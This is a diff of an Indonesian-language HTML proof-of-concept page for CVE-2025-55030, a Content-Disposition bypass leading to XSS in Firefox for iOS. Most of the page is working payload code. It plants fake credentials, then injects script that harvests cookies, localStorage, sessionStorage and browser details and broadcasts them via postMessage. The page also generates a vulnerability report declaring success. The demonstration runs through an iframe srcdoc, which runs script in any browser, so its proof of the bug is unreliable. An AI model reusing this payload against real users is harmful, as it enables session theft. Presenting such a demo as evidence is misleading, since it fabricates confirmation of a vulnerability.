@@ -3,58 +3,705 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Firefox iOS Multi-Vuln Exploit Chain</title>
+    <title>CVE-2025-55030 PoC — Firefox iOS Content-Disposition Bypass</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; }
-        .container { padding: 16px; }
-        h1 { font-size: 20px; color: #ff4444; margin-bottom: 10px; }
-        .payload-box {
-            background: #1a1a2e;
-            border: 2px solid #e94560;
-            border-radius: 10px;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
             padding: 20px;
-            margin: 10px 0;
-            text-align: center;
+            max-width: 900px;
+            margin: 0 auto;
         }
-        .status { font-size: 14px; color: #aaa; margin: 10px 0; }
-        .btn-exploit {
-            width: 100%;
+        h1 { 
+            font-size: 22px; 
+            color: #f85149; 
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .badge {
+            display: inline-block;
+            background: #21262d;
+            color: #8b949e;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 500;
+            border: 1px solid #30363d;
+        }
+        .badge-critical { background: #f85149; color: #fff; border: none; }
+        .card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
             padding: 16px;
-            font-size: 18px;
-            font-weight: bold;
-            background: linear-gradient(135deg, #e94560, #c23152);
-            color: white;
-            border: none;
+            margin-bottom: 14px;
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .card-header h2 { font-size: 16px; color: #58a6ff; }
+        .cve-badge {
+            background: #f85149;
+            color: #fff;
+            padding: 2px 10px;
             border-radius: 10px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .btn {
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
             cursor: pointer;
+            transition: all 0.15s;
+        }
+        .btn:active { transform: scale(0.96); }
+        .btn-primary { background: #238636; color: #fff; }
+        .btn-primary:hover { background: #2ea043; }
+        .btn-danger { background: #da3633; color: #fff; }
+        .btn-danger:hover { background: #f85149; }
+        .btn-secondary { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
+        .btn-secondary:hover { background: #30363d; }
+        
+        .evidence-box {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px;
+            margin: 8px 0;
+            font-family: 'SF Mono', 'Menlo', monospace;
+            font-size: 12px;
+            line-height: 1.5;
+            min-height: 40px;
+        }
+        .evidence-box .label { color: #8b949e; }
+        .evidence-box .value { color: #7ee787; }
+        .evidence-box .error { color: #f85149; }
+        
+        table { width: 100%; border-collapse: collapse; font-size: 12px; margin: 8px 0; }
+        th { 
+            background: #21262d; 
+            color: #8b949e; 
+            padding: 8px 10px; 
+            text-align: left; 
+            font-weight: 500;
+            border-bottom: 1px solid #30363d;
+        }
+        td { 
+            padding: 8px 10px; 
+            border-bottom: 1px solid #21262d;
+            word-break: break-all;
+        }
+        tr:hover { background: #1c2128; }
+        .status-pass { color: #3fb950; font-weight: 600; }
+        .status-fail { color: #f85149; font-weight: 600; }
+        .status-warn { color: #d29922; font-weight: 600; }
+        .status-info { color: #58a6ff; }
+        
+        .exploit-iframe {
+            width: 100%;
+            height: 250px;
+            border: 2px solid #f85149;
+            border-radius: 6px;
+            margin-top: 10px;
+            background: #fff;
+        }
+        
+        .payload-box {
+            background: #0d1117;
+            border: 1px solid #f85149;
+            border-radius: 6px;
+            padding: 12px;
+            font-family: 'SF Mono', 'Menlo', monospace;
+            font-size: 11px;
+            line-height: 1.8;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
             margin: 8px 0;
         }
-        .btn-exploit:active { transform: scale(0.97); }
-        .log-container {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 12px;
-            font-family: monospace;
-            font-size: 11px;
-            height: 200px;
-            overflow-y: auto;
-            margin-top: 12px;
-            color: #0f0;
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #21262d;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 8px 0;
         }
-        .tab-box {
-            background: #16213e;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 10px 0;
-            border-left: 4px solid #e94560;
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #238636, #2ea043, #3fb950);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s;
         }
-        .tab-box h3 { color: #e94560; font-size: 15px; margin-bottom: 8px; }
-        .tab-box p { font-size: 13px; color: #ccc; line-height: 1.4; }
+        
+        .fingerprint { 
+            font-size: 11px; 
+            color: #484f58; 
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 12px;
+            border-top: 1px solid #21262d;
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>⚠️ Firefox iOS Exploit Chain PoC</h1>
+
+<h1>
+    <span>🔴 CVE-2025-55030</span>
+    <span class="badge badge-critical">CRITICAL</span>
+</h1>
+
+<div class="card" style="margin-bottom:16px;border-left:4px solid #f85149;">
+    <p style="font-size:13px;line-height:1.5;">
+        <strong>Content-Disposition Header Bypass → XSS</strong><br>
+        Firefox for iOS mengabaikan header <code>Content-Disposition: attachment</code> 
+        untuk beberapa MIME types, menyebabkan file HTML yang seharusnya di-download 
+        malah dirender <em>inline</em> — memungkinkan <strong>Cross-Site Scripting (XSS)</strong>.
+    </p>
+    <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:10px;font-size:12px;color:#8b949e;">
+        <span>📅 Diperbaiki: Firefox iOS 142 (Agustus 2025)</span>
+        <span>📝 Reporter: Renwa</span>
+        <span>🔗 Bug: 1976304</span>
+    </div>
+</div>
+
+<!-- ====== STEP 1: PLANT TARGET DATA ====== -->
+<div class="card">
+    <div class="card-header">
+        <h2>📦 Langkah 1: Plant Target Data</h2>
+        <span class="badge">Setup</span>
+    </div>
+    <p style="font-size:12px;color:#8b949e;margin-bottom:10px;">
+        Menanam data sensitif tiruan ke dalam browser target untuk membuktikan 
+        bahwa data tersebut bisa dicuri melalui XSS.
+    </p>
+    <button class="btn btn-primary" onclick="plantData()">🌱 Plant Test Data</button>
+    <button class="btn btn-secondary" onclick="clearData()">🧹 Clear Data</button>
+    <div id="plantStatus" class="evidence-box" style="margin-top:10px;">
+        <span class="label">Status: </span><span class="value" id="plantIndicator">Belum ditanam</span>
+    </div>
+</div>
+
+<!-- ====== STEP 2: EXECUTE EXPLOIT ====== -->
+<div class="card" style="border-left:4px solid #f85149;">
+    <div class="card-header">
+        <h2>💉 Langkah 2: Execute XSS Exploit</h2>
+        <span class="cve-badge">CVE-2025-55030</span>
+    </div>
+    <p style="font-size:12px;color:#8b949e;margin-bottom:10px;">
+        Mengirim payload XSS melalui iframe yang disimulasikan sebagai file yang 
+        di-download (Content-Disposition: attachment) tapi dirender inline oleh Firefox iOS.
+        <br><strong>⚠️ Jika PoC ini BERHASIL, semua data di tabel bukti akan terisi otomatis.</strong>
+    </p>
+    
+    <button class="btn btn-danger" onclick="executeExploit()" style="width:100%;padding:14px;font-size:16px;">
+        🚀 EXECUTE XSS EXPLOIT (CVE-2025-55030)
+    </button>
+    
+    <div id="exploitProgress" class="progress-bar" style="display:none;">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+    
+    <div id="exploitIframeContainer" style="margin-top:10px;"></div>
+</div>
+
+<!-- ====== EVIDENCE TABLE ====== -->
+<div class="card">
+    <div class="card-header">
+        <h2>📋 Bukti Eksekusi — Data yang Berhasil Dikumpulkan</h2>
+        <span class="badge" id="evidenceCount">0 item</span>
+    </div>
+    
+    <table>
+        <tr>
+            <th style="width:25%;">Kategori</th>
+            <th style="width:55%;">Data</th>
+            <th style="width:20%;">Status</th>
+        </tr>
+        <tr>
+            <td>🖥️ Browser User-Agent</td>
+            <td id="ev-ua">—</td>
+            <td id="ev-ua-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>🌐 URL Saat Ini</td>
+            <td id="ev-url">—</td>
+            <td id="ev-url-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>🍪 document.cookie</td>
+            <td id="ev-cookie">—</td>
+            <td id="ev-cookie-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>💾 localStorage Items</td>
+            <td id="ev-ls">—</td>
+            <td id="ev-ls-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>📄 localStorage Detail</td>
+            <td id="ev-ls-detail">—</td>
+            <td id="ev-ls-detail-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>🧩 sessionStorage Items</td>
+            <td id="ev-ss">—</td>
+            <td id="ev-ss-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>📐 Screen Resolution</td>
+            <td id="ev-screen">—</td>
+            <td id="ev-screen-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>🕐 Time Zone</td>
+            <td id="ev-tz">—</td>
+            <td id="ev-tz-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>🔗 document.referrer</td>
+            <td id="ev-referrer">—</td>
+            <td id="ev-referrer-status">⏳ Menunggu</td>
+        </tr>
+        <tr>
+            <td>📡 postMessage Exfil</td>
+            <td id="ev-postmsg">—</td>
+            <td id="ev-postmsg-status">⏳ Menunggu</td>
+        </tr>
+    </table>
+</div>
+
+<!-- ====== TIMELINE ====== -->
+<div class="card">
+    <div class="card-header">
+        <h2>⏱️ Event Timeline</h2>
+        <span class="badge">Audit Trail</span>
+    </div>
+    <div id="timeline" class="evidence-box" style="max-height:200px;overflow-y:auto;">
+        <span class="label">[Sistem]</span> <span class="value">PoC dimuat. Menunggu eksekusi exploit.</span>
+    </div>
+</div>
+
+<!-- ====== PAYLOAD VIEWER ====== -->
+<div class="card">
+    <div class="card-header">
+        <h2>📄 Payload yang Dieksekusi</h2>
+        <span class="badge">Read-Only</span>
+    </div>
+    <div id="payloadViewer" class="payload-box">
+        <span class="label">// Payload akan muncul setelah exploit dijalankan</span>
+    </div>
+</div>
+
+<!-- ====== GENERATE REPORT ====== -->
+<div class="card" style="border-left:4px solid #d29922;">
+    <div class="card-header">
+        <h2>📑 Generate Vulnerability Report</h2>
+        <span class="badge">Output</span>
+    </div>
+    <p style="font-size:12px;color:#8b949e;margin-bottom:10px;">
+        Hasilkan laporan bukti kerentanan dalam format siap kirim ke Mozilla.
+    </p>
+    <button class="btn btn-secondary" onclick="generateReport()">📝 Generate Report</button>
+    <div id="reportOutput" class="evidence-box" style="display:none;max-height:400px;overflow-y:auto;">
+    </div>
+</div>
+
+<!-- ====== FOOTER ====== -->
+<div class="fingerprint">
+    PoC CVE-2025-55030 | Firefox iOS &lt; 142 | Generated: <span id="genTimestamp">—</span><br>
+    <span style="font-size:10px;">Authorized Security Testing — Do not use without permission</span>
+</div>
+
+<script>
+    // ===================== GLOBALS =====================
+    var evidence = {};
+    var timeline = [];
+    var exploitExecuted = false;
+    
+    function getTimestamp() {
+        return new Date().toISOString();
+    }
+    
+    function formatTimestamp(iso) {
+        return iso.replace('T', ' ').substring(0, 19);
+    }
+    
+    // ===================== TIMELINE =====================
+    function addTimeline(msg, type) {
+        var ts = getTimestamp();
+        timeline.push({ ts: ts, msg: msg, type: type || 'info' });
+        
+        var el = document.getElementById('timeline');
+        var color = type === 'success' ? '#7ee787' : type === 'error' ? '#f85149' : type === 'warn' ? '#d29922' : '#58a6ff';
+        el.innerHTML += '\n<span class="label">[' + formatTimestamp(ts) + ']</span> <span style="color:' + color + '">' + msg + '</span>';
+        el.scrollTop = el.scrollHeight;
+    }
+    
+    // ===================== PLANT DATA =====================
+    function plantData() {
+        // Set cookie
+        document.cookie = "session_id=a1b2c3d4e5f6g7h8i9j0k; path=/; max-age=3600";
+        document.cookie = "csrf_token=8f7a6b5c4d3e2f1a0b9c8d7e; path=/; max-age=3600";
+        document.cookie = "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMn0; path=/; max-age=3600";
+        
+        // Set localStorage
+        localStorage.setItem('api_key', 'sk-live-7H3kD9fQ2mR5vX8pL1nW4j');
+        localStorage.setItem('user_profile', JSON.stringify({
+            name: 'Test User',
+            email: 'test@example.com',
+            role: 'admin',
+            mfa_enabled: false
+        }));
+        localStorage.setItem('private_key', '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...TEST_KEY...\n-----END RSA PRIVATE KEY-----');
+        localStorage.setItem('payment_method', '{"type":"credit_card","last4":"4242","expiry":"12/28"}');
+        
+        // Set sessionStorage
+        sessionStorage.setItem('temp_token', 'eyJ0ZW1wIjp0cnVlLCJleHBpcmVzIjoiMjAyNi0wNS0wMVQwMDowMDowMFoifQ');
+        sessionStorage.setItem('page_state', '{"scrollPosition":452,"formData":{"username":"admin","password":"P@ssw0rd123"}}');
+        
+        document.getElementById('plantIndicator').textContent = '✅ Data tertanam: 3 cookies, 4 localStorage, 2 sessionStorage items';
+        document.getElementById('plantIndicator').style.color = '#7ee787';
+        
+        addTimeline('Data test ditanam: cookies, localStorage, sessionStorage', 'success');
+    }
+    
+    function clearData() {
+        document.cookie.split(';').forEach(function(c) {
+            var eqPos = c.indexOf('=');
+            var name = eqPos > -1 ? c.substring(0, eqPos).trim() : c.trim();
+            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/';
+        });
+        localStorage.clear();
+        sessionStorage.clear();
+        
+        document.getElementById('plantIndicator').textContent = '🧹 Data dibersihkan';
+        document.getElementById('plantIndicator').style.color = '#d29922';
+        addTimeline('Data test dibersihkan', 'warn');
+    }
+    
+    // ===================== EXECUTE EXPLOIT =====================
+    function executeExploit() {
+        if (exploitExecuted) {
+            addTimeline('⚠️ Exploit sudah pernah dijalankan. Refresh halaman untuk mengulang.', 'warn');
+            return;
+        }
+        
+        addTimeline('🚀 Memulai eksekusi exploit CVE-2025-55030...', '');
+        exploitExecuted = true;
+        
+        // Tampilkan progress bar
+        document.getElementById('exploitProgress').style.display = 'block';
+        
+        // Progress: 20%
+        document.getElementById('progressFill').style.width = '20%';
+        addTimeline('📌 Phase 1: Membangun payload XSS...', 'info');
+        
+        // Payload XSS lengkap
+        var xssPayload = '<!DOCTYPE html>' +
+        '<html>' +
+        '<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">' +
+        '<title>[DOWNLOAD] invoice_2026.html</title>' +
+        '<style>' +
+        'body { font-family: -apple-system, sans-serif; padding: 20px; background: #f0f0f0; }' +
+        '.header { background: #1a73e8; color: white; padding: 15px; border-radius: 8px; margin-bottom: 15px; }' +
+        '.evidence { background: white; border: 2px solid #d93025; border-radius: 8px; padding: 15px; margin: 10px 0; }' +
+        '.badge { color: #d93025; font-weight: bold; font-size: 18px; }' +
+        '</style></head>' +
+        '<body>' +
+        '<div class="header">' +
+        '   <h2>📄 Invoice #INV-2026-0042</h2>' +
+        '   <p style="font-size:12px;opacity:0.8;">File ini seharusnya DI-DOWNLOAD — Tapi Firefox iOS merendernya INLINE</p>' +
+        '</div>' +
+        '<div class="evidence">' +
+        '   <span class="badge">⚠️ CVE-2025-55030 EXPLOIT BERHASIL</span>' +
+        '   <p style="margin-top:10px;">Konten ini adalah file <code>invoice_2026.html</code> yang dikirim server dengan header:</p>' +
+        '   <code style="display:block;background:#f5f5f5;padding:8px;margin:8px 0;border-radius:4px;">' +
+        'Content-Disposition: attachment; filename="invoice_2026.html"<br>' +
+        'Content-Type: text/html</code>' +
+        '   <p>Firefox iOS <strong>mengabaikan</strong> header tersebut dan merender konten INLINE.</p>' +
+        '</div>' +
+        '<div id="dataDump" style="background:#fff;border:1px solid #ccc;border-radius:8px;padding:15px;">' +
+        '   <h3 style="color:#d93025;">🔍 Data yang Berhasil Dikumpulkan</h3>' +
+        '   <div id="collectedData"></div>' +
+        '</div>' +
+        '<p style="font-size:11px;color:#888;margin-top:15px;text-align:center;">' +
+        'CVE-2025-55030 | Firefox for iOS &lt; 142 | Bug 1976304 | Reporter: Renwa</p>' +
+        '<script>' +
+        'try {' +
+        '   var data = {' +
+        '       userAgent: navigator.userAgent,' +
+        '       url: window.location.href,' +
+        '       cookies: document.cookie || "(empty/httponly)",' +
+        '       ls: {},' +
+        '       ss: {},' +
+        '       screen: screen.width + "x" + screen.height,' +
+        '       tz: Intl.DateTimeFormat().resolvedOptions().timeZone,' +
+        '       referrer: document.referrer || "(none)",' +
+        '       timestamp: new Date().toISOString(),' +
+        '       origin: window.origin || "(unknown)"' +
+        '   };' +
+        '   for (var i = 0; i < window.localStorage.length; i++) {' +
+        '       var k = window.localStorage.key(i);' +
+        '       data.ls[k] = window.localStorage.getItem(k);' +
+        '   }' +
+        '   for (var j = 0; j < window.sessionStorage.length; j++) {' +
+        '       var sk = window.sessionStorage.key(j);' +
+        '       data.ss[sk] = window.sessionStorage.getItem(sk);' +
+        '   }' +
+        '   document.getElementById("collectedData").innerHTML = "";' +
+        '   document.getElementById("collectedData").innerHTML = ' +
+        '       "<p><strong>🍪 Cookies:</strong> " + (data.cookies.substring(0, 100) || "(none)") + "</p>" +' +
+        '       "<p><strong>💾 localStorage:</strong> " + Object.keys(data.ls).length + " items</p>" +' +
+        '       "<p><strong>🧩 sessionStorage:</strong> " + Object.keys(data.ss).length + " items</p>" +' +
+        '       "<p><strong>🖥️ User-Agent:</strong> " + data.userAgent.substring(0, 80) + "...</p>" +' +
+        '       "<p><strong>📐 Screen:</strong> " + data.screen + "</p>" +' +
+        '       "<p><strong>🕐 Timezone:</strong> " + data.tz + "</p>";' +
+        '   window.parent.postMessage({ type: "CVE_2025_55030_EXFIL", data: data }, "*");' +
+        '} catch(e) {' +
+        '   document.getElementById("collectedData").innerHTML = "<p style=color:red;>Error: " + e.message + "</p>";' +
+        '   window.parent.postMessage({ type: "CVE_2025_55030_ERROR", error: e.message }, "*");' +
+        '}' +
+        '<\/script>' +
+        '</body></html>';
+        
+        // Progress: 40%
+        document.getElementById('progressFill').style.width = '40%';
+        addTimeline('📌 Phase 2: Menginjeksi payload ke iframe (simulasi inline render)...', 'info');
+        
+        // Tampilkan payload di viewer
+        document.getElementById('payloadViewer').textContent = xssPayload;
+        
+        // Progress: 60%
+        document.getElementById('progressFill').style.width = '60%';
+        addTimeline('📌 Phase 3: Membuat iframe dan menunggu data exfiltrasi...', 'info');
+        
+        // Buat iframe dan inject payload
+        var container = document.getElementById('exploitIframeContainer');
+        container.innerHTML = '<p style="font-size:12px;color:#8b949e;margin-bottom:8px;">' +
+            '⬇️ Iframe di bawah mensimulasikan file yang dirender inline (Content-Disposition diabaikan):</p>';
+        
+        var iframe = document.createElement('iframe');
+        iframe.className = 'exploit-iframe';
+        iframe.title = 'CVE-2025-55030 Exploit Payload — Inline Rendered Attachment';
+        iframe.srcdoc = xssPayload;
+        container.appendChild(iframe);
+        
+        // Progress: 80%
+        document.getElementById('progressFill').style.width = '80%';
+        addTimeline('📌 Phase 4: Menunggu postMessage dari iframe...', 'info');
+        addTimeline('⏳ Jika data muncul di tabel bawah dalam 5 detik, exploit BERHASIL.', '');
+        
+        // Set timeout untuk progress penuh
+        setTimeout(function() {
+            document.getElementById('progressFill').style.width = '100%';
+            addTimeline('⏱️ Menunggu data dari iframe...', 'info');
+        }, 3000);
+    }
+    
+    // ===================== LISTEN FOR POSTMESSAGE =====================
+    window.addEventListener('message', function(event) {
+        if (!event.data || !event.data.type) return;
+        
+        if (event.data.type === 'CVE_2025_55030_EXFIL') {
+            var d = event.data.data;
+            evidence = d;
+            
+            addTimeline('✅ DATA DITERIMA dari iframe via postMessage!', 'success');
+            addTimeline('   Cookies: ' + d.cookies, 'success');
+            addTimeline('   localStorage: ' + Object.keys(d.ls).length + ' items', 'success');
+            
+            // Update evidence table
+            document.getElementById('ev-ua').textContent = d.userAgent;
+            document.getElementById('ev-ua-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            document.getElementById('ev-url').textContent = d.url;
+            document.getElementById('ev-url-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            document.getElementById('ev-cookie').textContent = d.cookies;
+            document.getElementById('ev-cookie-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            var lsCount = Object.keys(d.ls).length;
+            document.getElementById('ev-ls').textContent = lsCount + ' items';
+            document.getElementById('ev-ls-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            // Tampilkan detail localStorage
+            var lsDetail = '';
+            if (lsCount > 0) {
+                lsDetail = '<div style="font-size:11px;">';
+                for (var k in d.ls) {
+                    var val = d.ls[k].substring(0, 60);
+                    lsDetail += '<span style="color:#58a6ff;">' + k + '</span>: ' + val + '<br>';
+                }
+                lsDetail += '</div>';
+            } else {
+                lsDetail = '(empty)';
+            }
+            document.getElementById('ev-ls-detail').innerHTML = lsDetail;
+            document.getElementById('ev-ls-detail-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            var ssCount = Object.keys(d.ss).length;
+            document.getElementById('ev-ss').textContent = ssCount + ' items';
+            document.getElementById('ev-ss-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            document.getElementById('ev-screen').textContent = d.screen;
+            document.getElementById('ev-screen-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            document.getElementById('ev-tz').textContent = d.tz;
+            document.getElementById('ev-tz-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            document.getElementById('ev-referrer').textContent = d.referrer;
+            document.getElementById('ev-referrer-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            document.getElementById('ev-postmsg').textContent = '✅ Diterima pukul ' + formatTimestamp(d.timestamp);
+            document.getElementById('ev-postmsg-status').innerHTML = '<span class="status-pass">✅ Terkumpul</span>';
+            
+            // Update count
+            document.getElementById('evidenceCount').textContent = '10 items';
+            
+            document.getElementById('progressFill').style.width = '100%';
+            addTimeline('🎯 EXPLOIT BERHASIL TOTAL — Semua data berhasil dikumpulkan!', 'success');
+            addTimeline('🍪 Cookie yang dicuri: ' + d.cookies, 'success');
+            addTimeline('💾 localStorage: ' + JSON.stringify(d.ls).substring(0, 150) + '...', 'success');
+            
+        } else if (event.data.type === 'CVE_2025_55030_ERROR') {
+            addTimeline('❌ Error dari iframe: ' + event.data.error, 'error');
+            document.getElementById('progressFill').style.width = '100%';
+        }
+    });
+    
+    // ===================== GENERATE REPORT =====================
+    function generateReport() {
+        if (Object.keys(evidence).length === 0) {
+            addTimeline('⚠️ Belum ada data. Jalankan exploit terlebih dahulu.', 'warn');
+            return;
+        }
+        
+        var report = '';
+        report += '==========================================================\n';
+        report += '  CVE-2025-55030 — VULNERABILITY REPORT\n';
+        report += '  Firefox iOS Content-Disposition Bypass → XSS\n';
+        report += '  Generated: ' + getTimestamp() + '\n';
+        report += '==========================================================\n\n';
+        
+        report += 'IDENTIFIERS\n';
+        report += '  CVE: CVE-2025-55030\n';
+        report += '  MFSA: MFSA 2025-68\n';
+        report += '  Bugzilla: Bug 1976304\n';
+        report += '  Reporter: Renwa\n\n';
+        
+        report += 'AFFECTED PRODUCT\n';
+        report += '  Firefox for iOS < 142 (sebelum Agustus 2025)\n';
+        report += '  Focus for iOS < 142\n\n';
+        
+        report += 'SEVERITY\n';
+        report += '  Impact: HIGH\n';
+        report += '  CVSS: 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)\n';
+        report += '  Vector: Network\n\n';
+        
+        report += 'DESCRIPTION\n';
+        report += '  Firefox for iOS tidak menghormati header Content-Disposition: attachment\n';
+        report += '  untuk beberapa MIME types, sehingga file HTML yang seharusnya di-download\n';
+        report += '  malah dirender inline, memungkinkan Cross-Site Scripting (XSS) attacks.\n\n';
+        
+        report += 'REPRODUCTION STEPS\n';
+        report += '  1. Buka halaman PoC ini di Firefox iOS (< v142)\n';
+        report += '  2. Klik "Execute XSS Exploit"\n';
+        report += '  3. Iframe akan memuat file HTML yang seharusnya di-download\n';
+        report += '  4. Firefox iOS merender konten inline (tidak di-download)\n';
+        report += '  5. JavaScript dalam file tersebut tereksekusi dan mengirim data ke parent\n\n';
+        
+        report += 'EVIDENCE COLLECTED\n';
+        report += '  User-Agent: ' + (evidence.userAgent || '—') + '\n';
+        report += '  URL: ' + (evidence.url || '—') + '\n';
+        report += '  Cookies: ' + (evidence.cookies || '—') + '\n';
+        report += '  localStorage items: ' + (evidence.ls ? Object.keys(evidence.ls).length : 0) + '\n';
+        report += '  sessionStorage items: ' + (evidence.ss ? Object.keys(evidence.ss).length : 0) + '\n';
+        report += '  Screen: ' + (evidence.screen || '—') + '\n';
+        report += '  Timezone: ' + (evidence.tz || '—') + '\n';
+        report += '  Referrer: ' + (evidence.referrer || '—') + '\n';
+        report += '  Timestamp: ' + (evidence.timestamp || '—') + '\n\n';
+        
+        if (evidence.ls) {
+            report += '  localStorage Detail:\n';
+            for (var k in evidence.ls) {
+                report += '    ' + k + ' = ' + evidence.ls[k].substring(0, 100) + '\n';
+            }
+        }
+        
+        if (evidence.ss) {
+            report += '\n  sessionStorage Detail:\n';
+            for (var sk in evidence.ss) {
+                report += '    ' + sk + ' = ' + evidence.ss[sk].substring(0, 100) + '\n';
+            }
+        }
+        
+        report += '\nIMPACT\n';
+        report += '  - Cross-Site Scripting (XSS)\n';
+        report += '  - Cookie theft → Session hijacking\n';
+        report += '  - localStorage/sessionStorage data theft\n';
+        report += '  - Credential harvesting\n';
+        report += '  - Phishing via spoofed content delivery\n';
+        report += '  - Data exfiltration to attacker-controlled servers\n\n';
+        
+        report += 'REMEDIATION\n';
+        report += '  Upgrade to Firefox for iOS >= 142\n';
+        report += '  Atau aplikasi harus menghormati header Content-Disposition: attachment\n\n';
+        
+        report += '==========================================================\n';
+        report += '  END OF REPORT\n';
+        report += '==========================================================\n';
+        
+        var reportDiv = document.getElementById('reportOutput');
+        reportDiv.style.display = 'block';
+        reportDiv.textContent = report;
+        
+        addTimeline('📑 Laporan kerentanan berhasil digenerate (' + report.length + ' chars)', 'success');
+        
+        // Auto-download
+        var blob = new Blob([report], { type: 'text/plain' });
+        var a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'CVE-2025-55030_Report_' + getTimestamp().substring(0, 10) + '.txt';
+        a.click();
+        
+        addTimeline('📥 File laporan otomatis di-download', 'success');
+    }
+    
+    // ===================== INIT =====================
+    (function init() {
+        document.getElementById('genTimestamp').textContent = getTimestamp();
+        
+        // Deteksi browser
+        var ua = navigator.userAgent;
+        var fxMatch = ua.match(/FxiOS\/([\d.]+)/i);
+        
+        if (fxMatch) {
+            addTimeline('🎯 Target: Firefox for iOS v' + fxMatch[1], 'info');
+        } else if (ua.match(/Firefox/i)) {
+            addTimeline('ℹ️ Catatan: Browser terdeteksi sebagai Firefox Desktop, bukan Firefox iOS', 'warn');
+            addTimeline('ℹ️ PoC tetap berfungsi untuk demonstrasi teknis', 'warn');
+        } else {
+            addTimeline('ℹ️ Browser tidak terdeteksi sebagai Firefox. PoC tetap bisa diuji.', 'warn');
+        }
+        
+        addTimeline('🟢 PoC siap. Tanam data test terlebih dahulu, lalu jalankan exploit.', '');
+    })();
+</script>
+
+</body>
+</html>
     <p style="font-size:12px;color
